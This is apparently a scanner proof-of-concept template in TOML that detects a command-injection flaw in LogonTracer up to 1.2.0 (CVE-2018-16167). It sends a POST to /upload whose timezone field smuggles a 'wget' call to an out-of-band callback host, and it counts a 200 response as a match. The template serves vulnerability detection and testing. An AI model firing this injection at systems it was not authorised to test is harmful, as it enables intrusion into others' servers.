[info]
author = "AVE"
description = "通过向 /upload 接口发送特制 POST 请求，利用 timezone 参数注入 OS 命令，触发目标服务器向攻击者控制的 interactsh 服务器发起 HTTP 请求，验证命令执行漏洞存在。"
id = "POC-AVE-2018-0103"
name = "LogonTracer <=1.2.0 Remote Command Injection PoC"
severity = "critical"
tags = ["ave-2018-0103"]
vuln_id = [
    "CVE-2018-16167",
    "AVE-2018-0103",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/upload"
protocol = "http"

[poc.requests.body]
content = "logtype=XML&timezone=1%3Bwget+http%3A%2F%2F{{interactsh-url}}%3B"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
